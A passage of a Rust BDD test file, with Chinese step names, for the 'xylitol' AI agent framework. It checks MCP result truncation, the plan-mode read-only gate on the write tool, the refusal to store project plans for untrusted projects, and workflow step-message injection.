    use xylitol_official_plugin_mcp::{MCP_RESULT_MAX_BYTES, McpResultTruncate};
    use xylitol_plugin_sdk::{AfterToolCtx, AgentPart, LoopMiddleware};
    let big = "x".repeat(MCP_RESULT_MAX_BYTES + 100);
    let ctx = AfterToolCtx {
        turn_index: 0,
        tool_call_id: "call-1".into(),
        tool_name: "mcp__srv__tool".into(),
        parts: vec![AgentPart::text(big.clone())],
        details: None,
        is_error: false,
    };
    let mw = McpResultTruncate::new();
    let step = futures::executor::block_on(mw.after_tool(ctx));
    let out_len = step.ctx.parts[0].as_text().map(str::len).unwrap_or(0);
    TRUNCATE_OUT.with(|c| *c.borrow_mut() = Some((big.len(), out_len)));
}

#[when("该结果经过截断中间件")]
pub(crate) fn w_result_through_truncate() {}

#[then("结果变短且含截断提示")]
pub(crate) fn t_result_truncated() {
    let (before, after) = TRUNCATE_OUT
        .with(|c| *c.borrow())
        .expect("truncate must have run");
    assert!(after < before, "must shrink: before={before} after={after}");
}

#[given("MCP 工具返回文本加图片分片")]
pub(crate) fn g_mcp_multi_part() {
    use xylitol_official_plugin_mcp::McpResultTruncate;
    use xylitol_plugin_sdk::{AfterToolCtx, AgentPart, ImageContent, LoopMiddleware};
    let ctx = AfterToolCtx {
        turn_index: 0,
        tool_call_id: "call-2".into(),
        tool_name: "mcp__srv__tool".into(),
        parts: vec![
            AgentPart::text("note"),
            AgentPart::Image(ImageContent {
                url: None,
                data: Some("AAA".into()),
                media_type: "image/png".into(),
            }),
        ],
        details: None,
        is_error: false,
    };
    let mw = McpResultTruncate::new();
    let step = futures::executor::block_on(mw.after_tool(ctx));
    let parts = step.ctx.parts.len();
    let images = step
        .ctx
        .parts
        .iter()
        .filter(|p| matches!(p, AgentPart::Image(_)))
        .count();
    TRUNCATE_OUT.with(|c| *c.borrow_mut() = Some((parts, images)));
}

#[then("分片数量与图片分片保持不变")]
pub(crate) fn t_multi_part_preserved() {
    let (parts, images) = TRUNCATE_OUT
        .with(|c| *c.borrow())
        .expect("truncate must have run");
    assert_eq!(parts, 2, "part count must stay 2");
    assert_eq!(images, 1, "the image part must survive");
}

thread_local! {
    static PLAN_GATE: RefCell<Option<Arc<dyn LoopMiddleware>>> =
        const { RefCell::new(None) };
    static PLAN_GATE_OUT: RefCell<Option<(LoopControl, serde_json::Value, Option<String>)>> = const { RefCell::new(None) };
}

fn plan_gate_request_ctx(
    session_id: &str,
    plan_mode: xylitol_plugin_sdk::session::PlanMode,
) -> BeforeLlmRequestCtx {
    BeforeLlmRequestCtx {
        turn_index: 0,
        messages: Vec::new(),
        tool_schemas: Vec::new(),
        options: xylitol_plugin_sdk::XyGenerateOptions::default(),
        todo: None,
        plan_mode: Some(plan_mode),
        session_id: Some(session_id.into()),
    }
}

fn plan_gate_tool_ctx(name: &str) -> BeforeToolCtx {
    BeforeToolCtx {
        turn_index: 0,
        tool_call_id: "plan-gate-call".into(),
        tool_name: name.into(),
        args: serde_json::json!({ "path": "src/lib.rs" }),
        deny_reason: None,
    }
}

#[given("计划模式激活且只读策略开启")]
pub(crate) fn g_plan_gate_active() {
    use xylitol_plugin_sdk::session::PlanMode;

    let mw = xylitol_official_plugin_plan::plan_mode_middleware(
        &xylitol_official_plugin_plan::PlanConfig::default(),
    );
    futures::executor::block_on(
        mw.before_llm_request(plan_gate_request_ctx("s-plan-gate", PlanMode::plan(None))),
    );
    PLAN_GATE.with(|slot| slot.borrow_mut().replace(mw));
}

#[when("尝试执行 write")]
pub(crate) fn w_plan_gate_write() {
    let mw = PLAN_GATE
        .with(|slot| slot.borrow().clone())
        .expect("plan gate fixture");
    let out = futures::executor::block_on(mw.before_tool(plan_gate_tool_ctx("write")));
    PLAN_GATE_OUT.with(|slot| {
        *slot.borrow_mut() = Some((out.control, out.ctx.args, out.ctx.deny_reason));
    });
}

#[when("切回执行模式并尝试执行 write")]
pub(crate) fn w_plan_gate_execute_write() {
    use xylitol_plugin_sdk::session::PlanMode;

    let mw = PLAN_GATE
        .with(|slot| slot.borrow().clone())
        .expect("plan gate fixture");
    futures::executor::block_on(
        mw.before_llm_request(plan_gate_request_ctx("s-plan-gate", PlanMode::execute())),
    );
    let out = futures::executor::block_on(mw.before_tool(plan_gate_tool_ctx("write")));
    PLAN_GATE_OUT.with(|slot| {
        *slot.borrow_mut() = Some((out.control, out.ctx.args, out.ctx.deny_reason));
    });
}

#[then("工具在计划模式闸被拒绝")]
pub(crate) fn t_plan_gate_denied() {
    let (control, args, deny_reason) = PLAN_GATE_OUT
        .with(|slot| slot.borrow().clone())
        .expect("plan gate outcome");
    assert_eq!(
        control,
        LoopControl::Continue,
        "a plan-mode denial must not end the run"
    );
    assert_eq!(deny_reason.as_deref(), Some("plan mode is read-only"));
    assert_eq!(args["blocked_by"], "plan-mode");
    assert_eq!(args["reason"], "plan mode is read-only");
}

#[then("拒绝不结束本回合且可改调计划工具")]
pub(crate) fn t_plan_gate_denial_keeps_run() {
    let (control, _args, deny_reason) = PLAN_GATE_OUT
        .with(|slot| slot.borrow().clone())
        .expect("plan gate outcome");
    assert_eq!(
        control,
        LoopControl::Continue,
        "denial must not end the run"
    );
    assert_eq!(deny_reason.as_deref(), Some("plan mode is read-only"));
    let mw = PLAN_GATE
        .with(|slot| slot.borrow().clone())
        .expect("plan gate fixture");
    let out = futures::executor::block_on(mw.before_tool(plan_gate_tool_ctx("plan_write")));
    assert_eq!(
        out.control,
        LoopControl::Continue,
        "the model must be able to switch to plan_write in the same run"
    );
    assert_eq!(out.ctx.deny_reason, None);
}

#[then("工具在计划模式闸被允许")]
pub(crate) fn t_plan_gate_allowed() {
    let (control, args, deny_reason) = PLAN_GATE_OUT
        .with(|slot| slot.borrow().clone())
        .expect("plan gate outcome");
    assert_eq!(control, LoopControl::Continue, "write must be allowed");
    assert_eq!(deny_reason, None);
    assert_eq!(args["path"], "src/lib.rs");
}

thread_local! {
    static PLAN_STORE_FIXTURE: RefCell<Option<PlanStoreFixture>> = const { RefCell::new(None) };
    static PLAN_STORE_OUT: RefCell<Option<Result<String, String>>> = const { RefCell::new(None) };
}

struct PlanStoreFixture {
    gateway: Arc<xylitol_official_plugin_plan::SessionPlanGateway>,
    store: Arc<dyn xylitol_plugin_sdk::XySessionStore>,
    _project: tempfile::TempDir,
    _global: tempfile::TempDir,
}

fn plan_store_doc(
    scope: xylitol_plugin_sdk::session::PlanScope,
) -> xylitol_plugin_sdk::session::PlanDoc {
    use xylitol_plugin_sdk::session::{PlanDoc, PlanDocStatus, PlanDocStep, TodoStatus};
    PlanDoc {
        plan_id: "p-store".into(),
        title: "Store plan".into(),
        status: PlanDocStatus::Draft,
        scope,
        steps: vec![PlanDocStep {
            id: "s1".into(),
            content: "do it".into(),
            depends_on: Vec::new(),
            verification: None,
            status: TodoStatus::Pending,
        }],
        created_at: 1,
        updated_at: 2,
    }
}

async fn plan_store_fixture(trusted: bool) -> PlanStoreFixture {
    let store: Arc<dyn xylitol_plugin_sdk::XySessionStore> =
        Arc::new(xylitol_official_plugin_session::SessionManager::in_memory());
    store
        .create("s-plan-store", Some("."), None)
        .await
        .expect("create");
    let project = tempfile::tempdir().expect("project");
    let global = tempfile::tempdir().expect("global");
    let gateway = xylitol_official_plugin_plan::SessionPlanGateway::new_with_roots(
        store.clone(),
        project.path().to_path_buf(),
        global.path().to_path_buf(),
        trusted,
    );
    gateway.bind_session(Some("s-plan-store".into())).await;
    PlanStoreFixture {
        gateway,
        store,
        _project: project,
        _global: global,
    }
}

#[given("已信任项目且写入 project 计划")]
pub(crate) fn g_trusted_project_plan() {
    let fixture = futures::executor::block_on(plan_store_fixture(true));
    let written = futures::executor::block_on(fixture.gateway.write(plan_store_doc(
        xylitol_plugin_sdk::session::PlanScope::Project,
    )));
    assert!(written.is_ok(), "trusted project plan must be written");
    PLAN_STORE_FIXTURE.with(|slot| slot.borrow_mut().replace(fixture));
}

#[when("新会话按活动 plan_ref 读取")]
pub(crate) fn w_resume_project_plan() {
    let fixture = PLAN_STORE_FIXTURE
        .with(|slot| {
            slot.borrow()
                .as_ref()
                .map(|f| (f.store.clone(), f.gateway.clone()))
        })
        .expect("plan store fixture");
    let resumed = futures::executor::block_on(async {
        let gateway = xylitol_official_plugin_plan::SessionPlanGateway::new_with_roots(
            fixture.0.clone(),
            std::env::temp_dir(),
            std::env::temp_dir(),
            true,
        );
        gateway.bind_session(Some("s-plan-store".into())).await;
        gateway.read(None, None).await
    });
    PLAN_STORE_OUT.with(|slot| {
        *slot.borrow_mut() = Some(match resumed {
            Ok(Some(doc)) => Ok(format!("{}:{}", doc.plan_id, doc.scope.label())),
            Ok(None) => Err("plan not found".into()),
            Err(e) => Err(e.to_string()),
        })
    });
}

#[then("返回同一 project 计划")]
pub(crate) fn t_resume_project_plan() {
    let out = PLAN_STORE_OUT
        .with(|slot| slot.borrow().clone())
        .expect("plan store outcome");
    assert_eq!(out.as_deref(), Ok("p-store:project"));
}

#[given("项目未信任")]
pub(crate) fn g_untrusted_project_plan() {
    let fixture = futures::executor::block_on(plan_store_fixture(false));
    PLAN_STORE_FIXTURE.with(|slot| slot.borrow_mut().replace(fixture));
}

#[when("写入 project 计划")]
pub(crate) fn w_write_project_plan() {
    let fixture = PLAN_STORE_FIXTURE
        .with(|slot| slot.borrow().as_ref().map(|f| f.gateway.clone()))
        .expect("plan store fixture");
    let result = futures::executor::block_on(fixture.write(plan_store_doc(
        xylitol_plugin_sdk::session::PlanScope::Project,
    )));
    PLAN_STORE_OUT.with(|slot| {
        *slot.borrow_mut() = Some(result.map(|_| "ok".into()).map_err(|e| e.to_string()))
    });
}

#[then("返回 PermissionDenied 且不降级")]
pub(crate) fn t_untrusted_project_plan() {
    let out = PLAN_STORE_OUT
        .with(|slot| slot.borrow().clone())
        .expect("plan store outcome");
    let err = out.expect_err("untrusted project must fail");
    assert!(
        err.contains("permission denied") || err.contains("PermissionDenied"),
        "{err}"
    );
    let fixture = PLAN_STORE_FIXTURE
        .with(|slot| slot.borrow().as_ref().map(|f| f.store.clone()))
        .expect("fixture");
    let entries =
        futures::executor::block_on(fixture.load_leaf_branch("s-plan-store")).expect("entries");
    assert!(
        !entries.iter().any(|entry| matches!(
            entry,
            xylitol_plugin_sdk::session::SessionEntry::Custom(custom)
                if custom.custom_type == xylitol_plugin_sdk::session::CUSTOM_TYPE_PLAN_DOC
        )),
        "untrusted project plan must not fall back to session storage"
    );
}

thread_local! {
    static WORKFLOW_TOOL_OUT: RefCell<Option<Vec<String>>> = const { RefCell::new(None) };
}

#[given("workflow 插件启用且写入含一个 pending 步骤的 workflow")]
pub(crate) fn g_workflow_tool_write() {
    let store: Arc<dyn xylitol_plugin_sdk::XySessionStore> =
        Arc::new(xylitol_official_plugin_session::SessionManager::in_memory());
    futures::executor::block_on(store.create("s-workflow-tool", Some("."), None)).expect("create");
    let gateway = xylitol_official_plugin_workflow::SessionWorkflowGateway::new(store.clone());
    futures::executor::block_on(gateway.bind_session(Some("s-workflow-tool".into())));
    let tools = xylitol_official_plugin_workflow::workflow_tools(
        gateway,
        xylitol_plugin_sdk::session::DEFAULT_MAX_DEPTH,
        xylitol_plugin_sdk::session::DEFAULT_MAX_TOTAL_STEPS,
    );
    let tool = tools
        .iter()
        .find(|tool| tool.name() == "workflow_write")
        .expect("workflow_write")
        .clone();
    let result = futures::executor::block_on(tool.execute(
        &xylitol_plugin_sdk::XyToolCtx::new("bdd-workflow"),
        serde_json::json!({
            "goal": "ship",
            "steps": [{"id": "s1", "description": "do it", "verification": "tests pass"}]
        }),
    ))
    .expect("workflow_write");
    assert!(result.contains("\"runnable\":\"s1\""), "{result}");
    let mw = xylitol_official_plugin_workflow::workflow_middleware(
        Some(store),
        None,
        &xylitol_official_plugin_workflow::WorkflowConfig::default(),
    );
    let out = futures::executor::block_on(mw.before_llm_request(BeforeLlmRequestCtx {
        turn_index: 0,
        messages: Vec::new(),
        tool_schemas: Vec::new(),
        options: xylitol_plugin_sdk::XyGenerateOptions::default(),
        todo: None,
        plan_mode: None,
        session_id: Some("s-workflow-tool".into()),
    }));
    WORKFLOW_TOOL_OUT.with(|slot| {
        *slot.borrow_mut() = Some(
            out.ctx
                .messages
                .iter()
                .map(|message| message.text())
                .collect(),
        )
    });
}

#[then("注入当前步骤指令")]
pub(crate) fn t_workflow_tool_step() {
    let messages = WORKFLOW_TOOL_OUT
        .with(|slot| slot.borrow().clone())
        .expect("workflow messages");
    let text = messages.join("\n");
    assert!(text.contains("<plan_step>"), "{text}");
    assert!(text.contains("s1"), "{text}");
}

#[when("模型下一轮 before_llm_request")]
pub(crate) fn w_workflow_next_model() {}

thread_local! {
    static NESTED_WORKFLOW_OUT: RefCell<Option<Vec<String>>> = const { RefCell::new(None) };
}

fn nested_leaf(
    id: &str,
    status: xylitol_plugin_sdk::session::WorkflowStepStatus,
) -> xylitol_plugin_sdk::session::WorkflowStep {
    use xylitol_plugin_sdk::session::{WorkflowRisk, WorkflowStep};
    WorkflowStep {
        id: id.into(),
        description: format!("do {id}"),
        depends_on: Vec::new(),
        inputs: Vec::new(),
        outputs: Vec::new(),
        tools: Vec::new(),
        risk: WorkflowRisk::Low,
        verification: None,
        rollback: None,
        requires_human: false,
        status,
        output_ref: None,
        sub_workflow: None,
    }
}

#[given("嵌套 workflow 的子步骤已完成")]
pub(crate) fn g_nested_workflow_child_completed() {
    use xylitol_plugin_sdk::session::{Workflow, WorkflowStepStatus};

    let store: Arc<dyn xylitol_plugin_sdk::XySessionStore> =
        Arc::new(xylitol_official_plugin_session::SessionManager::in_memory());
    futures::executor::block_on(store.create("s-nested", Some("."), None)).expect("create");
    let child = Workflow {
        goal: "child".into(),
        steps: vec![nested_leaf("c1", WorkflowStepStatus::Completed)],
        resume_cursor: None,
        updated_at: 1,
    };
    let root = Workflow {
        goal: "root".into(),
        steps: vec![xylitol_plugin_sdk::session::WorkflowStep {
            sub_workflow: Some(Box::new(child)),
            ..nested_leaf("s1", WorkflowStepStatus::Pending)
        }],
        resume_cursor: None,
        updated_at: 1,
    };
    futures::executor::block_on(
        store.append_session_entry("s-nested", &root.to_custom_entry_shell()),
    )
    .expect("seed nested workflow");
    let mw = xylitol_official_plugin_workflow::workflow_middleware(
        Some(store),
        None,
        &xylitol_official_plugin_workflow::WorkflowConfig::default(),
    );
    let out = futures::executor::block_on(mw.before_llm_request(BeforeLlmRequestCtx {
        turn_index: 0,
        messages: Vec::new(),
        tool_schemas: Vec::new(),
        options: xylitol_plugin_sdk::XyGenerateOptions::default(),
        todo: None,
        plan_mode: None,
        session_id: Some("s-nested".into()),
    }));
    NESTED_WORKFLOW_OUT.with(|slot| {
        *slot.borrow_mut() = Some(
            out.ctx
                .messages
                .iter()
                .map(|message| message.text())
                .collect(),
        )
    });
}

#[then("注入全部完成总结")]
pub(crate) fn t_nested_workflow_completed() {
    let messages = NESTED_WORKFLOW_OUT
        .with(|slot| slot.borrow().clone())
        .expect("nested workflow messages");
    let text = messages.join("\n");
    assert!(text.contains("<plan_complete>"), "{text}");
}
